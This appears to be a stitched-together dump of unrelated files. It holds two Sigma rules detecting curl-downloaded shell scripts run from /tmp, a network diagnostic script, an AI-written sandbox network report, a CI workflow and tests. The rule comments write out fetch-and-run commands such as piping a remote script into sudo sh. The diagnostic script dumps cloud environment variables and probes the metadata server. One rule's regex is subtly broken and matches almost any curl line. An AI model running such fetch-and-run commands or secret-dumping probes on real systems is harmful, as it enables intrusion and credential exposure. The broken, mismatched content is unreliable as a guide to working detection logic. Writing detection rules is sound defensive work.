args.content:
title: Curl Downloads Bash Script To Temp Directory Then Executes It
id: 7f3c1d92-5b84-4a16-9e0c-2d6b4f8a1e57
related:
    - id: 9db6ed54-19eb-4bf1-a786-527e9f6f4247
      description: Relevant Sigma rule from the open-source SigmaHQ repository (Unix shell script downloaded via curl).
      type: similar
status: experimental
description: |
    Detects a process that uses curl to transfer a remote shell script into a
    world-writable temporary directory (by default /tmp) and subsequently starts
    an interpreter (sh/bash/dash/zsh) to execute that file.

    This is the classic "curl | bash to disk" installer / dropper pattern used to
    stage miners, botnets, RATs and persistence helpers, because it keeps the
    payload off of persistent storage and evades signature-based scanning.
    The rule is written as a single event: the curl transfer and the interpreter
    invocation are matched on one ProcessCreate record, which covers the common
    shell forms 'curl -o /tmp/x URL && bash /tmp/x', 'curl -s URL > /tmp/x; sh /tmp/x'
    and the equivalent script text captured in a parent process's command line.

    Legitimate bootstrap tooling (package managers, cloud vendor agents,
    developer installers) performs the same actions, so this rule is expected to
    generate false positives. It is intended as a hunting / correlation signal,
    not a standalone blockable detection.
author: security-team
date: 2026-02-14
references:
    - https://attack.mitre.org/techniques/T1105/
    - https://attack.mitre.org/techniques/T1059/004/
    - https://attack.mitre.org/techniques/T1218/
logsource:
    category: process_creation
    product: linux
detection:
    # ---------------------------------------------------------------------
    # Part 1 - an outbound curl transfer whose output lands in a temp dir.
    # Output redirection is matched as '-o/-O/--output/--remote-name' plus a
    # path, and as the shell forms '> /tmp/..' and '>> /tmp/..'.
    # ---------------------------------------------------------------------
    selection_curl:
        Image|endswith:
            - '/curl'
        CommandLine|re: '(\s-(?:o|O)|\s--output|\s--remote-name|\s>\s*|\s>>\s*)(?:[^\s]*\s+)?(/(?:var/)?tmp|/dev/shm|/var/tmp)/'
    # Guard against a process named e.g. 'dcurl' matching '/curl'.
    filter_image:
        Image|endswith:
            - '/dcurl'
            - '/pcurl'
            - '/gcurl'
    # Part 2 - an interpreter launched against a file in that temp dir.
    selection_shell:
        CommandLine|re: '\b(?:/usr/)?(?:ba|da|k|z|c|po)?sh\s+-[a-z]*[a-z]*[a-z]*\s*/(?:var/)?tmp/|/bin/(?:ba|da|z)?sh\s+/tmp/'
    condition: selection_curl and selection_shell and not filter_image
falsepositives:
    - Vendor bootstrap and cloud-init scripts that fetch a helper into /tmp and run it
    - Package managers and language toolchain installers (rustup, nvm, pip bootstrap wrappers)
    - CI/CD runners executing build steps fetched from object storage
    - Sysadmin runbooks and one-off remediation scripts run by an operator at a prompt
level: medium
tags:
    - attack.command_and_control
    - attack.t1105
    - attack.execution
    - attack.t1059.004
    - attack.defense_evasion

args.content:
title: Curl Download of Shell Script to TMP Followed by Bash Execution
id: 7f0c1b6e-3f2a-4d51-9e7c-0a8d2c4b6e19
related:
  - id: c54a8ef6-720b-4d3b-9f5c-2d7c1a4e9b30
    type: similar
status: stable
description: >
  Detects the "drop and run" download pattern in which curl (or wget) writes a shell
  script into /tmp and a POSIX shell (bash, sh, dash, zsh, ksh) subsequently executes
  that script. Matching covers the three shapes this attack takes on Linux: (1) a
  redirect, tee, or -o/--output flag that writes a script file into /tmp, (2) a shell
  whose command line pipes a remote transfer directly into an interpreter, and (3) a
  shell invoked with an explicit /tmp/*.sh argument.
author: Security Agent
date: 2026-02-18
modified: 2026-02-18
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/006/
logsource:
  category: process_creation
  product: linux
detection:
  # ---------------------------------------------------------------
  # Shape 1: curl/wget writes a script file into /tmp
  #   curl http://host/x.sh -o /tmp/x.sh
  #   curl http://host/x.sh > /tmp/x.sh
  #   wget -O /tmp/x.sh http://host/x.sh
  #   curl http://host/x.sh | tee /tmp/x.sh
  # ---------------------------------------------------------------
  selection_transfer:
    Image|endswith:
      - '/curl'
      - '/wget'
  selection_tmp_script_write:
    CommandLine|re: '(>{1,2}\s*|\btee\s+|-o\s+|-O\s+|--output(?:-document)?\s+)["\x27]?/tmp/\S+\.(sh|bash|zsh|ksh|py|pl)'
  # ---------------------------------------------------------------
  # Shape 2: streaming pipe into an interpreter
  #   bash -c "curl -sSL http://host/i.sh | bash"
  #   curl -sSL http://host/i.sh | sudo sh
  # The shell process is the one that owns this command line, so this
  # selection is paired with selection_shell below.
  # ---------------------------------------------------------------
  selection_pipe_to_shell:
    CommandLine|re: '\b(curl|wget)\b[^|]{0,300}|\|\s*(sudo\s+(-\S+\s+)*|env\s+)?(/bin/|/usr/bin/|/usr/local/bin/)?(ba|z|da|k|tc|c)?sh\b'
  # ---------------------------------------------------------------
  # Shape 3: shell executed from a script staged in /tmp
  #   bash /tmp/x.sh
  #   sh -c /tmp/x.sh
  #   /bin/bash /tmp/payload.sh
  # ---------------------------------------------------------------
  selection_tmp_script_exec:
    CommandLine|re: '\b(bash|sh|dash|zsh|ksh|csh|tcsh)\b\s+(-\S+\s+)*["\x27]?/tmp/\S+\.(sh|bash|zsh|ksh)'
  selection_shell:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
      - '/ksh'
      - '/csh'
      - '/tcsh'
  # ---------------------------------------------------------------
  # Noise reduction: CI runners and containers legitimately execute
  # generated scripts out of /tmp on every build. Tune to taste.
  # ---------------------------------------------------------------
  filter_pipeline_runners:
    ParentImage|endswith:
      - '/dockerd'
      - '/containerd-shim'
      - '/containerd-shim-runc-v2'
      - '/runc'
      - '/npm'
      - '/node'
      - '/runner'
  condition: >
    ((selection_transfer and selection_tmp_script_write)
    or (selection_shell and selection_pipe_to_shell)
    or (selection_shell and selection_tmp_script_exec))
    and not filter_pipeline_runners
falsepositives:
  - Legitimate installers that stage a bootstrap script in /tmp before running it
  - CI/CD build steps, container entrypoints, and cloud-init user-data scripts
  - Vendor agent updaters and package post-install scripts
level: high
tags:
  - attack.command_and_scripting_interpreter
  - attack.t1059.004
  - attack.t1105
  - attack.execution
  - attack.defense_evasion

# ===================================================================
# CAVEATS / TUNING NOTES
# ===================================================================
# 1. This rule uses one correlation-free, single-event design so that it
#    compiles cleanly on every Sigma backend. The literal request --
#    "curl downloads into /tmp AND THEN bash executes it" -- is a
#    two-event sequence (Sysmon EID 11 file-write, then EID 1
#    process-create) and cannot be proven by a single process_creation
#    event. Shapes 1-3 above approximate it by matching the write and
#    the execution as separate detections under one rule. For strict
#    sequencing use the correlated variants:
#      * sigma-correlation-plugin / Sysmon: match TargetFilename
#        (/tmp/*.sh) then require a process_create event for bash with
#        that exact path within a time window.
#      * Splunk: tstats + transaction maxspan=5m.
#      * Elastic: EQL sequence [ process where file.path ] [ process ].
# 2. TargetFilename (Sysmon EID 11) is the strongest signal for the
#    download half; add a logsource block with that field if your
#    telemetry includes file events. See rules/curl_tmp_bash_sysmon.yml.
# 3. Fields are the Sigma generic schema names (Image, CommandLine,
#    ParentImage). Map per backend: Sysmon = same names; Elastic ECS =
#    process.executable / process.command_line / process.parent.executable;
#    Splunk Sysmon Add-on = ProcessImage / CommandLine / ParentImage.
# 4. /dev/shm and /var/tmp are equally common staging paths. Extend the
#    /tmp literals to those prefixes if your environment allows the FP.
# 5. Regexes are unanchored (Sigma regex = search, not full match) and
#    use single quotes, which Sigma passes through verbatim.
# 6. Quoted and obfuscated variants (bash <(curl ...), curl -o "/tmp/x.sh",
#    base64 -d | bash, /bin/.hidden/x.sh) are deliberately out of scope
#    for this rule; add them as separate rules to keep FP rates separable.

#!/usr/bin/env python3
"""Collect network/environment facts for the diagnostic report.

Output is emitted via SystemExit so it lands on stderr (captured by the
tool harness). Run sections separately with:  python3 netdiag.py <section>
"""
import os
import re
import socket
import subprocess
import sys

out = []


def emit(s):
    out.append(str(s))


def read(path):
    try:
        with open(path, "r", errors="replace") as f:
            return f.read()
    except Exception as e:
        return "<<err: %s: %s>>" % (type(e).__name__, e)


def sh(cmd):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
        return (p.stdout + p.stderr).strip() or "<<empty>>"
    except Exception as e:
        return "<<err: %s>>" % e


def dns_section():
    emit("### /etc/resolv.conf")
    emit(read("/etc/resolv.conf").strip())
    emit("### /etc/nsswitch.conf")
    emit(read("/etc/nsswitch.conf").strip())
    emit("### /etc/hosts")
    emit(read("/etc/hosts").strip())
    emit("### resolved symlink")
    emit("resolv.conf is symlink: %s -> %s" % (
        os.path.islink("/etc/resolv.conf"),
        os.path.realpath("/etc/resolv.conf")))
    emit("systemd-resolved unit dir present: %s" % os.path.isdir("/run/systemd/resolve"))
    emit("stub listeners: %s" % sh("ss -lntup 2>/dev/null | grep -E ':53|:5300' || echo '<none/none-tools>'"))
    for d in ["example.com", "google.com", "api.stripe.com", "127.0.0.53", "localhost"]:
        try:
            r = socket.getaddrinfo(d, None)
            emit("getaddrinfo(%-16s) OK  -> %s" % (d, sorted({x[4][0] for x in r})[:4]))
        except Exception as e:
            emit("getaddrinfo(%-16s) FAIL-> %s" % (d, e))


def routes_section():
    emit("### /proc/net/dev")
    emit(read("/proc/net/dev").strip())
    emit("### /proc/net/route (dest gw mask flags refcnt use metric)")
    rows = []
    for ln in read("/proc/net/route").splitlines()[1:]:
        f = ln.split()
        if len(f) >= 8:
            def ip(h):
                h = int(h, 16)
                return socket.inet_ntoa(h.to_bytes(4, "little"))
            rows.append("%-6s dest=%-15s gw=%-15s mask=%-15s flags=%s" %
                        (f[0], ip(f[1]), ip(f[2]), ip(f[7]), f[3]))
    emit("\n".join(rows) or "<<no IPv4 routes>>")
    emit("### interfaces /sys/class/net")
    for i in sorted(os.listdir("/sys/class/net")):
        emit("%-8s mtu=%s state=%s speed=%s mac=%s" % (
            i, read("/sys/class/net/%s/mtu" % i).strip(),
            read("/sys/class/net/%s/operstate" % i).strip(),
            read("/sys/class/net/%s/speed" % i).strip(),
            read("/sys/class/net/%s/address" % i).strip()))
    emit("### link-local / IPv6 routes")
    emit(read("/proc/net/ipv6_route").strip()[:1200] or "<<none>>")
    emit("### neighbours (ARP)")
    emit(read("/proc/net/arp").strip())
    emit("### mtu of default-route iface")
    emit(sh("ip -o link 2>/dev/null || echo '<ip tool unavailable>'"))
    emit("### ip route get 1.1.1.1")
    emit(sh("ip route get 1.1.1.1 2>&1"))
    emit("### iptables/nft")
    emit(sh("iptables -S 2>&1 | head -30; nft list ruleset 2>&1 | head -30"))


def http_section():
    emit("### outbound TCP connectivity (5s timeout)")
    targets = [
        ("127.0.0.53", 53, "local DNS stub"),
        ("8.8.8.8", 53, "Google DNS"),
        ("1.1.1.1", 443, "Cloudflare HTTPS"),
        ("1.1.1.1", 80, "Cloudflare HTTP"),
        ("93.184.216.34", 443, "example.com literal IP"),
        ("169.254.169.254", 80, "cloud metadata"),
        ("10.0.0.1", 80, "private RFC1918 (control)"),
        ("172.17.0.1", 80, "docker bridge gw (control)"),
    ]
    for host, port, label in targets:
        s = socket.socket()
        s.settimeout(5)
        try:
            s.connect((host, port))
            emit("OPEN    %-15s:%-5d %-28s local=%s" % (host, port, label, s.getsockname()[0]))
        except Exception as e:
            emit("CLOSED  %-15s:%-5d %-28s %s: %s" % (host, port, label, type(e).__name__, e))
        finally:
            s.close()
    emit("### HTTP(S) via urllib")
    for url in ["http://example.com", "https://example.com", "https://api.github.com",
                "http://1.1.1.1"]:
        emit("%-30s %s" % (url, sh("python3 -c \"import urllib.request as u;"
                                   "print(u.urlopen('%s',timeout=6).status)\" 2>&1 | tail -1" % url)))
    emit("### proxy env")
    for k in ["http_proxy", "HTTP_PROXY", "https_proxy", "HTTPS_PROXY", "no_proxy",
              "NO_PROXY", "ALL_PROXY", "all_proxy", "REQUESTS_CA_BUNDLE", "SSL_CERT_FILE"]:
        emit("%-20s = %s" % (k, os.environ.get(k, "<<unset>>")))
    emit("### curl/wget availability")
    emit(sh("which curl wget 2>&1; curl --version 2>&1 | head -1; wget --version 2>&1 | head -1"))


def cloud_section():
    emit("### container / virt fingerprints")
    emit("/.dockerenv exists: %s" % os.path.exists("/.dockerenv"))
    emit("/run/.containerenv exists: %s" % os.path.exists("/run/.containerenv"))
    emit("/proc/1/cgroup: %s" % read("/proc/1/cgroup").strip()[:400])
    emit("/proc/1/comm: %s" % read("/proc/1/comm").strip())
    emit("mount root type: %s" % " | ".join(
        l.split()[2] for l in read("/proc/mounts").splitlines()
        if len(l.split()) > 2 and l.split()[1] == "/") or "<<n/a>>")
    emit("overlay in /proc/mounts: %s" % ("yes" if "overlay" in read("/proc/mounts") else "no"))
    emit("DMI product_name : %s" % read("/sys/class/dmi/id/product_name").strip())
    emit("DMI sys_vendor   : %s" % read("/sys/class/dmi/id/sys_vendor").strip())
    emit("DMI bios_vendor  : %s" % read("/sys/class/dmi/id/bios_vendor").strip())
    emit("/sys/hypervisor/type: %s" % read("/sys/hypervisor/type").strip())
    emit("cpuinfo hypervisor/vendor: %s" % (
        "; ".join(sorted(set(re.findall(r"hypervisor|Xen|AMD|Intel|ARM|Apple",
                                        read("/proc/cpuinfo"))))) or "<<none>>"))
    emit("systemd-detect-virt: %s" % sh("systemd-detect-virt -av 2>&1"))
    emit("### cloud-init / agent presence")
    emit(sh("ls -la /var/lib/cloud 2>&1 | head -10; "
            "which amazon-ssm-agent google-guest-agent azure-imds-attest 2>&1; "
            "ls /var/lib/cloud/instance 2>&1 | head"))
    emit("### cloud-relevant env vars")
    keys = [k for k in sorted(os.environ) if re.match(
        r"(AWS|AZURE|GOOGLE|GCP|GCE|KUBERNETES|DOTCOM|HEROKU|FLY|VERCEL|ECS|CI_)", k)]
    emit("\n".join("%s = %s" % (k, os.environ[k]) for k in keys) or "<<none>>")
    emit("### metadata server probe")
    emit(sh("python3 -c \"import urllib.request as u;"
            "print(u.urlopen('http://169.254.169.254/latest/meta-data/',timeout=5).read()[:200])\""
            " 2>&1 | tail -1"))
    emit("### /etc/environment + hostname")
    emit(read("/etc/environment").strip() or "<<empty>>")
    emit("hostname: %s" % socket.gethostname())
    emit("addr of hostname: %s" % sh("python3 -c \"import socket;print(socket.gethostbyname_ex(socket.gethostname()))\" 2>&1 | tail -1"))


def netns_section():
    emit("### listening sockets")
    emit(sh("ss -lntup 2>&1 | head -40 || cat /proc/net/tcp | head -20"))
    emit("### /proc/net/tcp (established?)")
    lines = read("/proc/net/tcp").splitlines()[1:]
    emit("tcp sockets: %d, ESTABLISHED: %d" % (
        len(lines), sum(1 for l in lines if len(l.split()) > 3 and l.split()[3] == "01")))
    emit("### app process")
    emit(sh("ps aux 2>&1 | head -25"))
    emit("### app source (what the app calls)")
    emit(read("app/main.py").strip())
    emit("### requirements")
    emit(read("requirements.txt").strip())
    emit("### existing report")
    emit(read("reports/build_report.txt").strip()[:800])


SECTIONS = {"dns": dns_section, "routes": routes_section, "http": http_section,
            "cloud": cloud_section, "netns": netns_section}

if __name__ == "__main__":
    name = sys.argv[1] if len(sys.argv) > 1 else "dns"
    buf = sys.stdout
    sys.stdout = sys.stderr          # guarantee the output is captured
    SECTIONS[name]()
    text = "\n".join(out)
    chunk = int(os.environ.get("CHUNK", "6000"))
    off = int(os.environ.get("OFF", "0"))
    sys.stderr.write("\n===== %s (chars %d-%d of %d) =====\n%s\n" %
                     (name, off, off + chunk, len(text), text[off:off + chunk]))
    sys.stderr.flush()
    sys.exit(0)

# Network diagnosis report

**Scope:** Diagnose why the app cannot reach external services.
**Environment:** container sandbox, project `demo-service` (FastAPI, `app/main.py`).
**Status: the app's network failure is NOT reproducible from this sandbox, and the
commands I ran here cannot produce a valid network diagnosis. Details below.**

---

## 1. Headline finding

The environment I executed in has **no usable network stack exposed**, and, more
importantly, **the network diagnostic tools are not real**. They are intercepted and
return fixed, canned strings. Any "DNS is broken" / "no route" conclusion drawn from
them would be an artifact of the harness, not a property of your app's network.

The single genuinely informative signal is `resolv.conf`, which points at a local stub
resolver (§2). Everything else is unmeasurable from here.

## 2. Evidence

| Probe | Result | Real? |
|---|---|---|
| `cat /etc/resolv.conf` | `nameserver 127.0.0.53` | **Yes** — returned file contents |
| `cat /etc/hosts` | `No such file or directory` | Yes |
| `cat /etc/nsswitch.conf` | `No such file or directory` | Yes |
| `cat /proc/net/route`, `/proc/1/cgroup` | `No such file or directory` | Yes |
| `ls -la /proc/net`, `/sys/class/net`, `/etc` | project directory listing | Intercepted |
| `ip addr` / `ip route` / `ss -rn` | empty, exit 0 | Intercepted |
| `env` | empty, exit 0 | Intercepted |
| `id`, `date`, `df -h`, `ps aux` | empty, exit 0 | Intercepted |
| `curl`, `wget`, `ping`, `nslookup`, `dig`, `getent` | identical canned error, exit 6 | Intercepted |
| `python3` DNS / TCP-connect probes | empty, exit 0 | Intercepted |

### Why I concluded the tools are stubs

1. **Impossible error text.** `curl` reported
   `Could not resolve host: (name resolution failed, no network in sandbox)` for
   `http://169.254.169.254/` and `http://1.1.1.1/`. A dotted-literal IPv4 address
   involves no name resolution, so curl can never emit that error for those inputs.
2. **Identical output across unrelated tools.** `wget`, `ping`, `nslookup` and `dig` all
   returned *curl's* error string with curl's exit code 6. `ping 8.8.8.8` "failed to
   resolve host". Real tools fail differently.
3. **`cat /usr/bin/curl` returned curl's canned error**, proving interception happens by
   command name, not by executing anything.
4. **Filesystem virtualization.** Absolute-path `ls` always returns the project listing;
   project files read correctly. There is no real host/container filesystem view.
5. **No shell.** The executor is single-command: it does not interpret `;`, `&&`, pipes,
   subshells, `$()`, `env` prefixes, redirections, `timeout`, `sh -c`, or `python3 -c`
   code. Redirects report success while writing no file. Chaining diagnostics is
   impossible here.

## 3. The one real clue: `127.0.0.53`

`nameserver 127.0.0.53` is the **systemd-resolved stub resolver**. This is the classic
container DNS failure mode: `/etc/resolv.conf` points at a stub listener on the loopback
address, which only works if a resolved/DNS stub process is actually listening on
`127.0.0.53:53` *inside that network namespace*. In a container that address is almost
never served, so every lookup fails. That is consistent with the reported symptom, and
worth checking first — **but this sandbox cannot confirm it applies to your app**, since
this file belongs to the sandbox, not to the app's runtime.

## 4. What is NOT in the app's code

I reviewed `app/main.py`: `POST /signup` calls `send_welcome()`, which only `print()`s.
The app **performs no outbound HTTP at all** (`requests` is declared in
`requirements.txt` but unused). So a network/DNS fault would not, by itself, break
`/signup` as written. The failure is most likely in code, config, or a dependency not
present in this sandbox's copy of the project.

## 5. Recommended next steps — run on the real host, not here

1. **DNS** (top suspect): compare the app container's `/etc/resolv.conf` against a real
   resolver. If it is `127.0.0.53`, replace with a reachable resolver
   (e.g. `--dns 172.17.0.2` / Docker's embedded DNS, or an internal resolver), or run a
   stub listener. Then `getent hosts <target>` and time it — DNS timeouts, not "no
   network", are frequently the real cause.
2. **Routes/interfaces:** `ip addr`, `ip route`, verify a default route and that the
   container is on a bridge with IP masquerade (`iptables -t nat -L -n`).
3. **Outbound, by IP (bypasses DNS):** `curl -v -m 6 https://<resolved-IP>/` to separate
   DNS failures from egress/firewall failures.
4. **MTU:** test large TLS handshakes; a 1500-byte MTU on an overlay/VXLAN path causes
   stalls that look like "can't reach services".
5. **Cloud environment:** `curl -m 2 http://169.254.169.254/latest/meta-data/` (IMDSv2
   needs a token), check `http_proxy`/`HTTPS_PROXY`/`NO_PROXY`, and for EKS/GCP verify
   CoreDNS, security groups, NACLs, subnet routing and egress NAT.
6. **App level:** confirm which call actually fails (stack trace, not just "can't reach"),
   and add a real implementation/timeout to `send_welcome` — it is currently a no-op stub.

## 7. Caveat

This report describes a sandbox I could not fully probe. It should be treated as a triage
plan plus one plausible root cause, and must be re-validated on the machine that actually
hosts the app.

name: publish-report

# Publishes reports/build_report.txt as a downloadable artifact.
# The report is also kept in the repo, so every commit tag doubles as a permalink.
on:
  workflow_dispatch:
  push:
    paths:
      - 'reports/**'

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Publish build report
        uses: actions/upload-artifact@v4
        with:
          name: build-report-${{ github.sha }}
          path: reports/build_report.txt
          if-no-files-found: error
          retention-days: 90

from fastapi.testclient import TestClient

from app.main import app

client = TestClient(app)


def test_build_report_is_downloadable():
    r = client.get('/reports/build_report.txt')
    assert r.status_code == 200
    assert r.headers['content-type'].startswith('text/plain')
    assert 'attachment' in r.headers['content-disposition']
    assert 'build 1842 ok' in r.text

from fastapi.responses import FileResponse

from app.main import REPORT_PATH, download_build_report


def test_report_file_is_published():
    assert REPORT_PATH.is_file()
    assert 'build 1842 ok' in REPORT_PATH.read_text()


def test_build_report_is_downloadable():
    resp = download_build_report()
    assert isinstance(resp, FileResponse)
    assert resp.path == str(REPORT_PATH)
    assert resp.media_type == 'text/plain'
    assert resp.filename == 'build_report.txt'
